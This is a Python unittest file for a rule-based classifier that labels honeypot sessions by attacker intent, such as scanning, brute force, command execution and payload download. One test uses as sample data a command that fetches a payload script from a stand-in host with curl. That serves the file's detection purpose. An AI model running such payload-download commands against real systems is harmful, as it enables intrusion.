"""Regression tests for explainable honeypot attack intent rules."""

import unittest

import pandas as pd

from src.analysis import classify_attack_intent


def session(**values):
    row = {
        "src_ip": "192.0.2.1",
        "n_failed_logins": 0,
        "n_success_logins": 0,
        "n_commands": 0,
        "commands": "",
        "behavior": "Unclustered",
    }
    row.update(values)
    return row


class TestAttackIntent(unittest.TestCase):
    def classify_rows(self, rows):
        return classify_attack_intent(pd.DataFrame(rows))

    def test_reconnaissance_requires_repeated_connection_only_sessions(self):
        result = self.classify_rows([session() for _ in range(3)])
        self.assertEqual(result["classification"], "Reconnaissance / Scanning")
        self.assertEqual(result["evidence"]["connection_only_sessions"], 3)

    def test_credential_brute_force_uses_repeated_failed_logins(self):
        result = self.classify_rows([session(n_failed_logins=3)])
        self.assertEqual(result["classification"], "Credential Brute Force")
        self.assertEqual(result["evidence"]["failed_login_events"], 3)

    def test_successful_login_is_reported_as_honeypot_access_attempt(self):
        result = self.classify_rows([session(n_success_logins=1)])
        self.assertEqual(
            result["classification"],
            "Successful Login / Access Attempt",
        )
        self.assertIn("does not prove compromise", result["inference_note"])

    def test_command_execution_without_download_tool(self):
        result = self.classify_rows([session(n_commands=1, commands="id")])
        self.assertEqual(result["classification"], "Command Execution")
        self.assertEqual(result["evidence"]["commands_observed"], ["id"])

    def test_payload_download_has_priority_and_keeps_overlapping_evidence(self):
        result = self.classify_rows([
            session(
                n_failed_logins=4,
                n_success_logins=1,
                n_commands=1,
                commands="curl -fsS https://example.invalid/payload.sh",
            )
        ])
        self.assertEqual(result["classification"], "Payload Download Attempt")
        self.assertEqual(result["evidence"]["failed_login_events"], 4)
        self.assertEqual(result["evidence"]["successful_login_events"], 1)
        self.assertEqual(result["evidence"]["download_tool_matches"], ["curl"])

    def test_single_failed_login_is_insufficient_evidence(self):
        result = self.classify_rows([session(n_failed_logins=1)])
        self.assertEqual(
            result["classification"],
            "Unknown / Insufficient Evidence",
        )

    def test_empty_sessions_and_repeated_calls_are_deterministic(self):
        empty = classify_attack_intent(pd.DataFrame())
        self.assertEqual(
            empty["classification"],
            "Unknown / Insufficient Evidence",
        )
        rows = [session(n_commands=1, commands="uname -a")]
        self.assertEqual(self.classify_rows(rows), self.classify_rows(rows))


if __name__ == "__main__":
    unittest.main()
